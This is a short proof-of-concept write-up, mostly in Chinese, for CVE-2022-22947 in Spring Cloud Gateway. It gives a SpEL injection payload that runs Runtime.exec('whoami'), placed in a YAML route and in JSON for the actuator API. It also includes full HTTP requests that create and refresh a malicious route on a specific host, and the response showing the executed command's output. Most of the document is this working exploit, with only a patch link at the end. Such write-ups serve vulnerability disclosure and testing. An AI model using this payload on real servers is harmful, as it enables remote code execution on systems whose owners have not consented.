# CVE-2022-22947

> 分析详见: [CVE-2022-22947 分析-云社区-华为云](https://bbs.huaweicloud.com/blogs/335870)

## POC

**edit yml config**

在配置文件中新增路由

```yml
spring:
  cloud:
    gateway:
      routes:
      - id: after_route
        uri: https://example.org
        predicates:
        - name: Cookie
          args:
            name: "#{T(java.lang.Runtime).getRuntime().exec('whoami')}"
            regexp: mycookievalue
```

**from actuator api**

根据 actuator api[^1],可以利用 `/gateway/routes/{id_route_to_create}` 接口来刷新路由

```json
{
  "id": "first_route",
  "predicates": [
    {
      "name": "Cookie",
      "args": {
        "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
        "_genkey_1": "mycookievalue"
      }
    }
  ],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}
```

1. 创建路由

```http
POST /actuator/gateway/routes/first_route HTTP/1.1
Host: 7.250.141.54:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 0
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{
  "id": "first_route",
  "predicates": [
    {
      "name": "Cookie",
      "args": {
        "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
        "_genkey_1": "mycookievalue"
      }
    }
  ],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}
```

2. 刷新路由

```http
POST /actuator/gateway/refresh HTTP/1.1
Host: 7.250.141.54:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Origin: http://7.250.141.54:8080
Referer: http://7.250.141.54:8080/actuator/gateway/routes
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
```

3. 获取命令执行结果

访问 `actuator/gateway/routes`

```json
{
  "predicate": "Cookie: name=desktop-um80nhi\\xu regexp=mycookievalue",
  "route_id": "first_route",
  "filters": [ ],
  "uri": "https://www.uri-destination.org:443",
  "order": 0
}
```

## Patch

> [Comparing v3.0.6...v3.0.7 · spring-cloud/spring-cloud-gateway](https://github.com/spring-cloud/spring-cloud-gateway/compare/v3.0.6...v3.0.7)


[^1]: [11. Actuator API](https://cloud.spring.io/spring-cloud-gateway/multi/multi__actuator_api.html)